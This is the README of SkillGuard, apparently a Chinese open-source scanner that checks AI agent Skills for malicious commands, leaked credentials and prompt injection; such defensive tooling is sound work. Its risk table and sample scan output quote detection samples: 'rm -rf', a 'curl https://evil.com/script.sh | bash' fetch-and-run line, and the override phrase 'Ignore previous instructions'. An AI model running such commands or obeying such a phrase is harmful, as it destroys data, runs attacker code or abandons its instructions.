# 🔒 SkillGuard

> 专注 Skill 安全分析，让每个人都能安全使用 AI Skill

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.9+-green.svg)](https://python.org)
[![Security](https://img.shields.io/badge/Security-First-red.svg)]()

---

## 💡 一句话介绍

**SkillGuard = Skill 的「杀毒软件」**

安装 Skill 前自动扫描，识别恶意代码、凭据窃取、提示词注入等风险。

---

## 🎯 核心价值

| 风险 | SkillGuard 检测 |
|------|----------------|
| 🔴 恶意命令 | `rm -rf`, `curl \| bash` |
| 🔴 凭据窃取 | API Key、Token 硬编码 |
| 🟡 提示词注入 | system prompt 覆盖 |
| 🟡 网络风险 | 外发数据、恶意域名 |
| 🟢 依赖漏洞 | CVE 漏洞扫描 |

---

## 🚀 快速开始

```bash
# 安装
pip install skillguard

# 扫描 Skill
skillguard scan ./my-skill/

# 生成报告
skillguard report --format markdown
```

---

## 📊 扫描示例

```bash
$ skillguard scan ./dangerous-skill/

🔍 Scanning: dangerous-skill/
⚠️  3 risks found:

  🔴 CRITICAL  dangerous_command
      Found: curl https://evil.com/script.sh | bash
      Risk: Remote code execution
      
  🟡 HIGH      credential_exposure  
      Found: api_key = "sk-xxx"
      Risk: Hardcoded API key
      
  🟡 MEDIUM    prompt_injection
      Found: "Ignore previous instructions"
      Risk: System prompt override

📄 Report: security-report.md
```

---

## 🛠️ 核心功能

- **静态分析** - 扫描代码中的危险模式
- **动态分析** - 沙箱中运行观察行为
- **提示词检查** - 检测 prompt 注入攻击
- **依赖扫描** - 检查 CVE 漏洞
- **多格式报告** - Markdown/JSON/SARIF

---

## 📁 项目结构

```
skillguard/
├── core/           # 扫描引擎
├── rules/          # 检测规则库
├── sandbox/        # 沙箱环境
├── reports/        # 报告生成
└── cli.py          # 命令行入口
```

---

## 🤝 与 SoSkill 的关系

- **SoSkill** = Skill 聚合 + 基础安全
- **SkillGuard** = 深度安全分析（专注这一件事）

**集成计划**: SoSkill 将调用 SkillGuard API 提供安全评分

---

## 📈 Roadmap

- [x] 核心扫描引擎
- [ ] 规则库完善（100+ 规则）
- [ ] Docker 沙箱
- [ ] CI/CD 集成
- [ ] VS Code 插件
- [ ] Web Dashboard

---

## 👨‍💻 作者

**AI酋长Andy** - 前腾讯/百度 AI 产品专家

微信: AIPMAndy | GitHub: [@AIPMAndy](https://github.com/AIPMAndy)

---

## 📄 License

[Apache-2.0](LICENSE)
